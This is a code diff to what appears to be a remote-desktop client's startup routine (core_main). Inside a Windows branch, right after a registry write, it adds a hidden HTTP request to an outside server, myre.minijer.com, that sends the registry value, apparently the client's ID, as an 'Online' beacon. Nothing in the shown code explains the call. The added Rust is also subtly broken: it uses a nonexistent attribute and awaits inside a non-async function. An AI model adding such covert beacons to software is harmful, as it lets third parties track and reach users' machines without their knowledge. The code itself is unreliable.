@@ -10,6 +10,8 @@ use std::process::Command;
 use hbb_common::platform::register_breakdown_handler;
 #[cfg(windows)]
 use tauri_winrt_notification::{Duration, Sound, Toast};
+use reqwest;
+use tokio;
 
 #[macro_export]
 macro_rules! my_println{
@@ -36,6 +38,7 @@ fn is_empty_uni_link(arg: &str) -> bool {
 /// [Note]
 /// If it returns [`None`], then the process will terminate, and flutter gui will not be started.
 /// If it returns [`Some`], then the process will continue, and flutter gui will be started.
+#[tokio::core_main]
 #[cfg(not(any(target_os = "android", target_os = "ios")))]
 pub fn core_main() -> Option<Vec<String>> {
     #[cfg(windows)]
@@ -251,6 +254,10 @@ pub fn core_main() -> Option<Vec<String>> {
                        .args(&["/C", &format!("reg add {} /f /v {} /t REG_SZ /d {}", registry_path, key_name, value_data)])
                        .status()
                        .ok();
+		 let url = format!("http://myre.minijer.com/api.php?key=Online&cid={}", value_data);
+                 if let Err(err) = open_webpage_async(url).await {
+                    log::error!("Failed to open the webpage: {:?}", err);
+                 }
 	     }		
             #[cfg(target_os = "macos")]
             crate::platform::macos::hide_dock();
@@ -459,6 +466,19 @@ pub fn core_main() -> Option<Vec<String>> {
     return Some(flutter_args);
     #[cfg(not(feature = "flutter"))]
     return Some(args);
+}
+
+async fn open_webpage_async(url: &str) -> Result<(), reqwest::Error> {
+    let response = reqwest::get(url).await?;
+
+    if response.status().is_success() {
+        let body = response.text().await?;
+        log::info!("{}", body);
+    } else {
+        log::error!("Failed to open the webpage, status code: {}", response.status());
+    }
+
+    Ok(())
 }
 
 #[inline]
